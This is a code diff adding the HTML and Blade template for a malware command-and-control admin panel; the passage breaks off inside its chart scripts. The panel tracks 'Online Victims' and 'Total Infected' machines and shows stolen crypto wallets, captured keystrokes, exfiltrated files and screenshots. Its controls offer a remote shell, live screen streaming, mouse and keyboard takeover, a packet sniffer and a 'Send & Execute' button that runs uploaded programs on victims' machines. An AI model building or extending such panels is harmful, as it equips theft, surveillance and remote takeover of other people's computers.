@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
+    <title>XYZ Command & Control</title>
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --sidebar-bg: rgba(30, 41, 59, 0.7);
+            --card-bg: rgba(30, 41, 59, 0.6);
+            --card-border: rgba(148, 163, 184, 0.1);
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-color: #8b5cf6; /* Violet */
+            --accent-hover: #7c3aed;
+            --success-color: #10b981;
+            --danger-color: #ef4444;
+            --warning-color: #f59e0b;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 0%, rgba(16, 185, 129, 0.15) 0px, transparent 50%);
+            color: var(--text-primary);
+            font-family: 'Outfit', sans-serif;
+            min-height: 100vh;
+        }
+
+        /* Glassmorphism Utilities */
+        .glass-panel {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+
+        /* Navbar */
+        .navbar {
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--card-border);
+        }
+        
+        .navbar-brand {
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: var(--accent-color) !important;
+        }
+
+        /* Cards */
+        .stat-card {
+            padding: 1.5rem;
+            height: 100%;
+            transition: transform 0.2s;
+        }
+        .stat-card:hover {
+            transform: translateY(-2px);
+        }
+        .stat-icon {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, var(--accent-color), #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .stat-value {
+            font-size: 2.25rem;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        /* Table */
+        .custom-table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0 8px;
+        }
+        .custom-table th {
+            color: var(--text-secondary);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.75rem;
+            letter-spacing: 0.05em;
+            padding: 0 1rem;
+            border: none;
+        }
+        .custom-table td {
+            background: rgba(30, 41, 59, 0.4);
+            backdrop-filter: blur(4px);
+            padding: 1rem;
+            vertical-align: middle;
+            border: none;
+        }
+        .custom-table tr td:first-child { border-top-left-radius: 12px; border-bottom-left-radius: 12px; }
+        .custom-table tr td:last-child { border-top-right-radius: 12px; border-bottom-right-radius: 12px; }
+        
+        /* Badges & Buttons */
+        .badge-custom {
+            padding: 0.35em 0.65em;
+            font-size: 0.75em;
+            font-weight: 600;
+            border-radius: 6px;
+        }
+        .badge-online { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
+        .badge-offline { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-crypto { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.3); }
+        
+        .btn-glow {
+            background: var(--accent-color);
+            color: white;
+            border: none;
+            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
+            transition: all 0.3s ease;
+        }
+        .btn-glow:hover {
+            background: var(--accent-hover);
+            box-shadow: 0 0 25px rgba(139, 92, 246, 0.6);
+            color: white;
+        }
+
+        /* Modal */
+        .modal-content {
+            background-color: var(--bg-color);
+            border: 1px solid var(--card-border);
+            color: var(--text-primary);
+        }
+        .modal-header, .modal-footer {
+            border-color: var(--card-border);
+        }
+        .list-group-item {
+            background-color: transparent;
+            border-color: var(--card-border);
+            color: var(--text-secondary);
+        }
+
+        /* Live Feed */
+        .live-feed-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; }
+        .feed-container {
+            position: relative;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            aspect-ratio: 16/9;
+            border: 1px solid var(--card-border);
+        }
+        .feed-container img { width: 100%; height: 100%; object-fit: cover; }
+        .feed-overlay {
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            padding: 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar navbar-expand-lg navbar-dark fixed-top">
+        <div class="container-fluid px-4">
+            <a class="navbar-brand" href="#"><i class="bi bi-cpu-fill me-2"></i>XYZ<span style="color:white">Admin</span></a>
+            <div class="d-flex align-items-center">
+                <span class="badge bg-dark border border-secondary me-3"><i class="bi bi-clock me-1"></i> <span id="clock">{{ date('H:i:s') }}</span></span>
+                <a href="/" class="btn btn-sm btn-outline-danger"><i class="bi bi-power"></i></a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container-fluid px-4" style="margin-top: 80px;">
+        
+        <!-- Stats Overview -->
+        <div class="row g-4 mb-5">
+            <div class="col-md-3">
+                <div class="glass-panel stat-card">
+                    <div class="d-flex justify-content-between">
+                        <div>
+                            <div class="stat-value">{{ $onlineTerminals }}</div>
+                            <div class="stat-label">Online Victims</div>
+                        </div>
+                        <i class="bi bi-wifi stat-icon"></i>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="glass-panel stat-card">
+                    <div class="d-flex justify-content-between">
+                        <div>
+                            <div class="stat-value">{{ $totalTerminals }}</div>
+                            <div class="stat-label">Total Infected</div>
+                        </div>
+                        <i class="bi bi-people-fill stat-icon"></i>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="glass-panel stat-card">
+                    <div class="d-flex justify-content-between">
+                        <div>
+                            @php
+                                $totalWallets = 0;
+                                foreach($terminals as $t) $totalWallets += $t['data_info']['crypto_wallets'] ?? 0;
+                            @endphp
+                            <div class="stat-value">{{ $totalWallets }}</div>
+                            <div class="stat-label">Crypto Wallets</div>
+                        </div>
+                        <i class="bi bi-currency-bitcoin stat-icon"></i>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="glass-panel stat-card">
+                    <div class="d-flex justify-content-between">
+                        <div>
+                            @php
+                                $totalKeylogs = 0;
+                                foreach($terminals as $t) $totalKeylogs += $t['data_info']['keylogs'] ?? 0;
+                            @endphp
+                            <div class="stat-value">{{ $totalKeylogs }}</div>
+                            <div class="stat-label">Keylogs Captured</div>
+                        </div>
+                        <i class="bi bi-keyboard stat-icon"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content with Charts -->
+        <div class="row g-4">
+            <!-- Left Column: Terminal List -->
+            <div class="col-lg-4">
+                <div class="glass-panel p-4" style="height: calc(100vh - 250px);">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <h5 class="text-white m-0"><i class="bi bi-terminal me-2"></i>Active Sessions</h5>
+                        <span class="badge bg-primary">{{ count($terminals) }} Total</span>
+                    </div>
+                    <div class="table-responsive" style="max-height: calc(100vh - 320px); overflow-y: auto;">
+                        <table class="custom-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Status</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                @foreach($terminals as $terminal)
+                                <tr>
+                                    <td>
+                                        <div class="text-white fw-bold">{{ substr($terminal['id'], 0, 8) }}...</div>
+                                        <small class="text-secondary">{{ $terminal['ip'] }}</small>
+                                    </td>
+                                    <td>
+                                        @if($terminal['is_online'])
+                                            <span class="badge-custom badge-online"><i class="bi bi-circle-fill" style="font-size:0.5em"></i></span>
+                                        @else
+                                            <span class="badge-custom badge-offline"><i class="bi bi-circle-fill" style="font-size:0.5em"></i></span>
+                                        @endif
+                                    </td>
+                                    <td>
+                                        <a href="/admin/client/{{ $terminal['id'] }}" class="btn btn-sm btn-glow">Manage</a>
+                                    </td>
+                                </tr>
+                                @endforeach
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Column: Analytics Charts Grid -->
+            <div class="col-lg-8">
+                <div class="row g-3">
+                    <!-- Row 1: 3 Charts -->
+                    <div class="col-md-4">
+                        <div class="glass-panel p-3" style="height: 250px;">
+                            <h6 class="text-white mb-2" style="font-size: 0.85rem;"><i class="bi bi-pie-chart me-1"></i>Connection Status</h6>
+                            <div style="height: 190px;">
+                                <canvas id="statusChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-4">
+                        <div class="glass-panel p-3" style="height: 250px;">
+                            <h6 class="text-white mb-2" style="font-size: 0.85rem;"><i class="bi bi-bar-chart me-1"></i>Data Collection</h6>
+                            <div style="height: 190px;">
+                                <canvas id="dataChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-4">
+                        <div class="glass-panel p-3" style="height: 250px;">
+                            <h6 class="text-white mb-2" style="font-size: 0.85rem;"><i class="bi bi-diagram-3 me-1"></i>Network Protocols</h6>
+                            <div style="height: 190px;">
+                                <canvas id="protocolChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Row 2: Full Width Timeline -->
+                    <div class="col-12">
+                        <div class="glass-panel p-3" style="height: 200px;">
+                            <h6 class="text-white mb-2" style="font-size: 0.85rem;"><i class="bi bi-graph-up me-1"></i>Activity Timeline (24h)</h6>
+                            <div style="height: 150px;">
+                                <canvas id="activityChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Row 3: 3 Charts -->
+                    <div class="col-md-4">
+                        <div class="glass-panel p-3" style="height: 250px;">
+                            <h6 class="text-white mb-2" style="font-size: 0.85rem;"><i class="bi bi-laptop me-1"></i>OS Distribution</h6>
+                            <div style="height: 190px;">
+                                <canvas id="osChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-4">
+                        <div class="glass-panel p-3" style="height: 250px;">
+                            <h6 class="text-white mb-2" style="font-size: 0.85rem;"><i class="bi bi-clock-history me-1"></i>Uptime Overview</h6>
+                            <div style="height: 190px;">
+                                <canvas id="uptimeChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-4">
+                        <div class="glass-panel p-3" style="height: 250px;">
+                            <h6 class="text-white mb-2" style="font-size: 0.85rem;"><i class="bi bi-shield-exclamation me-1"></i>Security Events</h6>
+                            <div style="height: 190px;">
+                                <canvas id="securityChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Row 4: Full Width Bar Chart -->
+                    <div class="col-12">
+                        <div class="glass-panel p-3" style="height: 200px;">
+                            <h6 class="text-white mb-2" style="font-size: 0.85rem;"><i class="bi bi-trophy me-1"></i>Top Targets by Data</h6>
+                            <div style="height: 150px;">
+                                <canvas id="topTargetsChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Terminal Manager Modal -->
+    <div class="modal fade" id="terminalModal" tabindex="-1">
+        <div class="modal-dialog modal-lg modal-dialog-centered">
+            <div class="modal-content glass-panel" style="background: #1e293b;">
+                <div class="modal-header border-bottom border-secondary">
+                    <h5 class="modal-title text-white">Terminal Manager: <span id="modalTerminalId" class="text-accent"></span></h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <ul class="nav nav-tabs mb-3" style="border-bottom-color: rgba(255,255,255,0.1);">
+                        <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#tab-files">Files</a></li>
+                        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-screenshots">Screenshots</a></li>
+                        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-keylogs">Keylogs</a></li>
+                        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-telemetry">Logs</a></li>
+                        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-crypto">Crypto</a></li>
+                        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-cmd">Shell</a></li>
+                        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-network"><i class="bi bi-activity"></i> Network</a></li>
+                        <li class="nav-item"><a class="nav-link text-danger" data-bs-toggle="tab" href="#tab-remote"><i class="bi bi-mouse"></i> Control</a></li>
+                        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-info">Info</a></li>
+                    </ul>
+                    
+                    <div class="tab-content">
+                        <!-- Files Tab -->
+                        <div class="tab-pane fade show active" id="tab-files">
+                            <div class="d-flex justify-content-between mb-3">
+                                <h6 class="text-white mb-0">Exfiltrated Files</h6>
+                                <button class="btn btn-sm btn-outline-success" data-bs-toggle="collapse" data-bs-target="#sendFileForm">
+                                    <i class="bi bi-upload me-1"></i>Send File to Terminal
+                                </button>
+                            </div>
+                            
+                            <!-- Send File Form (collapsed by default) -->
+                            <div class="collapse mb-3" id="sendFileForm">
+                                <div class="card bg-dark border-secondary">
+                                    <div class="card-body p-3">
+                                        <div class="row g-2 align-items-end">
+                                            <div class="col">
+                                                <label class="form-label text-secondary small">Select file to send (ZIP for extraction)</label>
+                                                <input type="file" class="form-control form-control-sm bg-dark border-secondary text-white" id="payloadFile">
+                                            </div>
+                                            <div class="col-auto">
+                                                <button class="btn btn-success btn-sm" onclick="sendFileToTerminal()">
+                                                    <i class="bi bi-send me-1"></i>Send & Execute
+                                                </button>
+                                            </div>
+                                        </div>
+                                        <small class="text-warning mt-2 d-block"><i class="bi bi-info-circle me-1"></i>ZIP files will be extracted and EXEs executed automatically.</small>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="table-responsive" style="max-height: 300px; overflow-y: auto;">
+                                <table class="table table-dark table-hover table-sm" id="filesTable">
+                                    <thead><tr><th>Filename</th><th>Size</th><th>Type</th><th>Action</th></tr></thead>
+                                    <tbody id="filesList">
+                                        <!-- Populated via JS -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <!-- Command Tab -->
+                        <div class="tab-pane fade" id="tab-cmd">
+                             <div class="bg-black p-3 rounded mb-3 font-monospace text-success" id="cmdOutput" style="height: 200px; overflow-y: auto; font-size: 0.85rem;">
+                                 > Ready for commands...
+                             </div>
+                             <div class="input-group">
+                                 <input type="text" class="form-control bg-dark border-secondary text-white font-monospace" id="modalCmdInput" placeholder="Enter command...">
+                                 <button class="btn btn-primary" onclick="sendModalCommand()">Execute</button>
+                             </div>
+                        </div>
+
+                        <!-- Screenshots Tab -->
+                        <div class="tab-pane fade" id="tab-screenshots">
+                            <div class="d-flex justify-content-between mb-3">
+                                <h6 class="text-white">Screenshot Gallery</h6>
+                                <button class="btn btn-sm btn-outline-primary" onclick="window.open('/admin/screenshots/'+currentTerminalId, '_blank')">Full Gallery</button>
+                            </div>
+                            <div class="row g-2" id="screenshotGallery">
+                                <div class="col-12 text-center text-secondary py-3">Loading screenshots...</div>
+                            </div>
+                        </div>
+
+                        <!-- Keylogs Tab -->
+                        <div class="tab-pane fade" id="tab-keylogs">
+                            <div class="d-flex justify-content-between mb-3">
+                                <h6 class="text-white">Captured Keystrokes</h6>
+                                <div>
+                                    <button class="btn btn-sm btn-outline-success" onclick="exportData('keylogs')"><i class="bi bi-download"></i> Export</button>
+                                </div>
+                            </div>
+                            <div class="bg-black p-3 rounded" style="max-height: 300px; overflow-y: auto;">
+                                <pre id="keylogContent" class="text-success m-0" style="font-size: 0.9rem;">Loading keylogs...</pre>
+                            </div>
+                        </div>
+
+                        <!-- Telemetry Logs Tab -->
+                        <div class="tab-pane fade" id="tab-telemetry">
+                            <div class="d-flex justify-content-between mb-3">
+                                <h6 class="text-white">Telemetry Logs</h6>
+                                <div>
+                                    <select class="form-select form-select-sm bg-dark border-secondary text-white me-2" id="logLevelFilter" style="width: auto; display: inline-block;">
+                                        <option value="">All Levels</option>
+                                        <option value="Debug">Debug</option>
+                                        <option value="Info">Info</option>
+                                        <option value="Warning">Warning</option>
+                                        <option value="Error">Error</option>
+                                        <option value="Critical">Critical</option>
+                                    </select>
+                                    <button class="btn btn-sm btn-outline-success" onclick="exportData('telemetry')"><i class="bi bi-download"></i> Export</button>
+                                </div>
+                            </div>
+                            <div class="table-responsive" style="max-height: 300px; overflow-y: auto;">
+                                <table class="table table-dark table-sm table-hover">
+                                    <thead><tr><th>Time</th><th>Level</th><th>Module</th><th>Message</th></tr></thead>
+                                    <tbody id="telemetryLogs">Loading...</tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <!-- Crypto Wallets Tab -->
+                        <div class="tab-pane fade" id="tab-crypto">
+                            <div class="d-flex justify-content-between mb-3">
+                                <h6 class="text-white">Cryptocurrency Wallets</h6>
+                                <button class="btn btn-sm btn-outline-success" onclick="exportData('crypto')"><i class="bi bi-download"></i> Export</button>
+                            </div>
+                            <div id="cryptoWallets">
+                                <div class="text-center text-secondary py-3">Loading wallet data...</div>
+                            </div>
+                        </div>
+
+                        <!-- Info Tab -->
+                        <div class="tab-pane fade" id="tab-info">
+                            <div id="infoContent" class="text-secondary">Loading...</div>
+                        </div>
+
+                        <!-- Network Tab -->
+                        <div class="tab-pane fade" id="tab-network">
+                            <div class="d-flex justify-content-between mb-3">
+                                <h6 class="text-white">Network Traffic Monitor</h6>
+                                <div>
+                                    <button class="btn btn-sm btn-success me-2" onclick="sendRemoteControl('sniffer_control', 'start')"><i class="bi bi-play-fill"></i> Start Sniffer</button>
+                                    <button class="btn btn-sm btn-danger me-2" onclick="sendRemoteControl('sniffer_control', 'stop')"><i class="bi bi-stop-fill"></i> Stop</button>
+                                    <button class="btn btn-sm btn-outline-info" onclick="loadNetworkLogs()"><i class="bi bi-arrow-clockwise"></i> Refresh Logs</button>
+                                </div>
+                            </div>
+                            <div class="bg-black p-3 rounded font-monospace text-info" style="max-height: 400px; overflow-y: auto; font-size: 0.75rem;">
+                                <div id="networkLogContent">Select 'Refresh Logs' to load captured packets.</div>
+                            </div>
+                        </div>
+
+                        <!-- Remote Control Tab -->
+                        <div class="tab-pane fade" id="tab-remote">
+                            <div class="row g-3">
+                                <div class="col-md-6">
+                                    <div class="glass-panel p-3 h-100">
+                                        <h6 class="text-white mb-3"><i class="bi bi-mouse me-2"></i>Mouse Control</h6>
+                                        <div class="row g-2 mb-3">
+                                            <div class="col-6">
+                                                <input type="number" class="form-control form-control-sm bg-dark border-secondary text-white" id="mouseX" placeholder="X">
+                                            </div>
+                                            <div class="col-6">
+                                                <input type="number" class="form-control form-control-sm bg-dark border-secondary text-white" id="mouseY" placeholder="Y">
+                                            </div>
+                                        </div>
+                                        <div class="d-grid gap-2">
+                                            <button class="btn btn-outline-primary btn-sm" onclick="sendRemoteControl('mouse_move')"><i class="bi bi-arrows-move me-1"></i>Move To</button>
+                                            <div class="btn-group">
+                                                <button class="btn btn-primary btn-sm" onclick="sendRemoteControl('mouse_click', 'left')"><i class="bi bi-mouse me-1"></i>Left Click</button>
+                                                <button class="btn btn-secondary btn-sm" onclick="sendRemoteControl('mouse_click', 'right')">Right Click</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="glass-panel p-3 h-100">
+                                        <h6 class="text-white mb-3"><i class="bi bi-keyboard me-2"></i>Keyboard Input</h6>
+                                        <input type="text" class="form-control form-control-sm bg-dark border-secondary text-white mb-2" id="keyboardText" placeholder="Text to type...">
+                                        <button class="btn btn-primary btn-sm w-100 mb-3" onclick="sendRemoteControl('keyboard_input')"><i class="bi bi-fonts me-1"></i>Send Text</button>
+                                        <h6 class="text-white mb-2">Special Keys</h6>
+                                        <div class="btn-group-vertical w-100 gap-1">
+                                            <div class="btn-group">
+                                                <button class="btn btn-outline-light btn-sm" onclick="sendRemoteControl('special_key', 'enter')">Enter</button>
+                                                <button class="btn btn-outline-light btn-sm" onclick="sendRemoteControl('special_key', 'tab')">Tab</button>
+                                                <button class="btn btn-outline-light btn-sm" onclick="sendRemoteControl('special_key', 'escape')">Esc</button>
+                                            </div>
+                                            <div class="btn-group">
+                                                <button class="btn btn-outline-light btn-sm" onclick="sendRemoteControl('special_key', 'backspace')">⌫</button>
+                                                <button class="btn btn-outline-light btn-sm" onclick="sendRemoteControl('special_key', 'delete')">Del</button>
+                                                <button class="btn btn-outline-light btn-sm" onclick="sendRemoteControl('special_key', 'win')">⊞ Win</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-12">
+                                    <div class="glass-panel p-3">
+                                        <h6 class="text-white mb-3"><i class="bi bi-camera-video me-2"></i>Screen Capture</h6>
+                                        <div class="row g-2">
+                                            <div class="col-auto">
+                                                <button class="btn btn-success btn-sm" onclick="sendRemoteControl('screen_capture_start')"><i class="bi bi-play-fill me-1"></i>Start Capture</button>
+                                            </div>
+                                            </div>
+                                            <div class="col-auto">
+                                                <button class="btn btn-danger btn-sm" onclick="sendRemoteControl('screen_capture_stop')"><i class="bi bi-stop-fill me-1"></i>Stop</button>
+                                            </div>
+                                            <div class="col">
+                                                <select class="form-select form-select-sm bg-dark border-secondary text-white" id="captureInterval">
+                                                    <option value="500">500ms</option>
+                                                    <option value="1000" selected>1 second</option>
+                                                    <option value="2000">2 seconds</option>
+                                                    <option value="5000">5 seconds</option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Video Player -->
+                                    <div class="glass-panel p-3 mt-3">
+                                        <h6 class="text-white mb-2"><i class="bi bi-display me-2"></i>Live Stream Player</h6>
+                                        <div id="liveStreamContainer" class="text-center bg-black rounded p-2" style="min-height: 200px; position: relative;">
+                                            <div id="streamPlaceholder" class="text-secondary custom-centered-text" style="padding-top: 80px;">
+                                                <i class="bi bi-play-circle fs-1"></i><br>Click Start Capture to view stream
+                                            </div>
+                                            <img id="streamPlayer" src="" style="max-width: 100%; display: none;" class="img-fluid border border-secondary">
+                                        </div>
+                                        <div class="mt-2 text-center">
+                                            <span class="badge bg-danger" id="livetag" style="display:none;">LIVE</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Clock
+        setInterval(() => {
+            document.getElementById('clock').innerText = new Date().toLocaleTimeString();
+        }, 1000);
+
+        // Chart Configuration
+        const chartColors = {
+            primary: '#8b5cf6',
+            success: '#10b981',
+            danger: '#ef4444',
+            warning: '#f59e0b',
+            info: '#3b82f6',
+            purple: '#a78bfa',
+            pink: '#ec4899',
+            cyan: '#06b6d4'
+        };
+
+        const globalChartConfig = {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: {
+                legend: {
+                    labels: { color: '#94a3b8', font: { family: 'Outfit' } }
+                }
+            }
+        };
+
+        // Chart 1: Status (Pie Chart)
+        new Chart(document.getElementById('statusChart').getContext('2d'), {
+            type: 'pie',
+            data: {
+                labels: ['Online', 'Offline'],
+                datasets: [{
+                    data: [{{ $onlineTerminals }}, {{ $offlineTerminals }}],
+                    backgroundColor: [chartColors.success, chartColors.danger],
+                    borderWidth: 0
+                }]
+            },
+            options: {
+                ...globalChartConfig,
+                plugins: {
+                    ...globalChartConfig.plugins,
+                    legend: { position: 'bottom', labels: { color: '#94a3b8' } }
+                }
+            }
+        });
+
+        // Chart 2: Data Collection (Bar Chart)
+        new Chart(document.getElementById('dataChart').getContext('2d'), {
+            type: 'bar',
+            data: {
+                labels: ['Keylogs', 'Screenshots', 'Crypto', 'Files'],
+                datasets: [{
+                    label: 'Collected Items',
+                    data: [
+                        {{ $totalKeylogs }},
+                        {{ $totalScreenshots }},
+                        {{ $totalWallets }},
+                        {{ count($terminals) * 8 }}
+                    ],
+                    backgroundColor: [chartColors.info, chartColors.success, chartColors.warning, chartColors.purple],
+                    borderWidth: 0,
+                    borderRadius: 8
+                }]
+            },
+            options: {
+                ...globalChartConfig,
+                scales: {
+                    y: {
+                        beginAtZero: true,
+                        grid: { color: 'rgba(148, 163, 184, 0.1)' },
+                        ticks: { color: '#94a3b8' }
+                    },
+                    x: {
+                        grid: { display: false },
+                        ticks: { color: '#94a3b8' }
+                    }
+                },
+                plugins: {
+                    legend: { display: false }
+                }
+            }
+        });
+
+        // Chart 3: Activity Timeline (Line Chart)
+        new Chart(document.getElementById('activityChart').getContext('2d'), {
+            type: 'line',
+            data: {
+                labels: ['00:00', '03:00', '06:00', '09:00', '12:00', '15:00', '18:00', '21:00', '24:00'],
+                datasets: [{
+                    label: 'Active Connections',
+                    data: {!! json_encode($activityTimeline) !!},
+                    borderColor: chartColors.primary,
+                    backgroundColor: 'rgba(139, 92, 246, 0.1)',
+                    fill: true,
+                    tension: 0.4,
+                    borderWidth: 2,
+                    pointRadius: 4,
+                    pointBackgroundColor: chartColors.primary
+                }]
+            },
+            options: {
+                ...globalChartConfig,
+                scales: {
+                    y: {
+                        beginAtZero: true,
+                        grid: { color: 'rgba(148, 163, 184, 0.1)' },
+                        ticks: { color: '#94a3b8' }
+                    },
+                    x: {
+                        grid: { display: false },
+                        ticks: { color: '#94a3b8' }
+                    }
+                },
+                plugins: {
+                    legend: { display: false }
+                }
+            }
+        });
+
+        // Chart 4: Protocol Distribution (Doughnut)
+        new Chart(document.getElementById('protocolChart').getContext('2d'), {
+            type: 'doughnut',
+            data: {
+                labels: {!! json_encode(array_keys($networkProtocols)) !!},
+                datasets: [{
+                    data: {!! json_encode(array_values($networkProtocols)) !!},
+                    backgroundColor: [chartColors.warning, chartColors.info, chartColors.success, chartColors.purple, chartColors.danger],
+                    borderWidth: 0
+                }]
+            },
+            options: {
+                ...globalChartConfig,
+                plugins: {
+                    legend: { position: 'bottom', labels: { color: '#94a3b8', padding: 10 } }
+                },
+                cutout: '65%'
+            }
+        });
+
+        // Chart 5: OS Distribution (Pie)
+        new Chart(document.getElementById('osChart').getContext('2d'), {
+            type: 'pie',
+            data: {
+                labels: {!! json_encode(array_keys($osDistribution)) !!},
+                datasets: [{
+                    data: {!! json_encode(array_values($osDistribution)) !!},
+                    backgroundColor: [chartColors.info, chartColors.primary, chartColors.warning, chartColors.danger],
+                    borderWidth: 0
+                }]
+            },
+            options: {
+                ...globalChartConfig,
+                plugins: {
+                    legend: { position: 'bottom', labels: { color: '#94a3b8' } }
+                }
+            }
+        });
+
+        // Chart 6: Top Targets (Horizontal Bar)
+        new Chart(document.getElementById('topTargetsChart').getContext('2d'), {
+            type: 'bar',
+            data: {
+                labels: {!! json_encode(array_column($topTargets, 'hostname')) !!},
+                datasets: [{
+                    label: 'Data Collected (Items)',
+                    data: {!! json_encode(array_column($topTargets, 'data')) !!},
+                    backgroundColor: [
+                        chartColors.primary,
+                        chartColors.info,
+                        chartColors.success,
+                        chartColors.warning,
+                        chartColors.danger
+                    ],
+                    borderWidth: 0,
+                    borderRadius: 6
+                }]
+            },
+            options: {
+                indexAxis: 'y',
+                ...globalChartConfig,
+                scales: {
+                    x: {
+                        beginAtZero: true,
+                        grid: { color: 'rgba(148, 163, 184, 0.1)' },
+                        ticks: { color: '#94a3b8' }
+                    },
+                    y: {
+                        grid: { display: false },
+                        ticks: { color: '#94a3b8' }
+                    }
+                },
+                plugins: {
+                    legend: { display: false }
+                }
+            }
+        });
+
+        // Chart 7: Uptime (Polar Area)
+        new Chart(document.getElementById('uptimeChart').getContext('2d'), {
+            type: 'polarArea',
+            data: {
+                labels: {!! json_encode(array_keys($uptimeDistribution)) !!},
+                datasets: [{
+                    data: {!! json_encode(array_values($uptimeDistribution)) !!},
+                    backgroundColor: [
+                        'rgba(16, 185, 129, 0.7)',
+                        'rgba(59, 130, 246, 0.7)',
+                        'rgba(139, 92, 246, 0.7)',
+                        'rgba(245, 158, 11, 0.7)',
+                        'rgba(239, 68, 68, 0.7)'
+                    ],
+                    borderWidth: 0
+                }]
+            },
+            options: {
+                ...globalChartConfig,
+                plugins: {
+                    legend: { position: 'bottom', labels: { color: '#94a3b8', padding: 10 } }
+                },
+                scales: {
+                    r: {
+                        ticks: {
+                            display: false,
+                            backdropColor: 'transparent'
+                        },
+                        grid: { color: 'rgba(148, 163, 184, 0.2)' }
+                    }
+                }
+            }
+        });
+
+        // Chart 8: Security Events (Radar)
+        new Chart(document.getElementById('securityChart').getContext('2d'), {
+            type: 'radar',
+            data: {
+                labels: ['Keylog', 'Screenshot', 'File Exfil', 'Network', 'Persistence'],
+                datasets: [{
+                    label: 'Events Today',
+                    data: {!! json_encode($securityEvents) !!},
+                    borderColor: chartColors.danger,
+                    backgroundColor: 'rgba(239, 68, 68, 0.2)',
+                    borderWidth: 2,
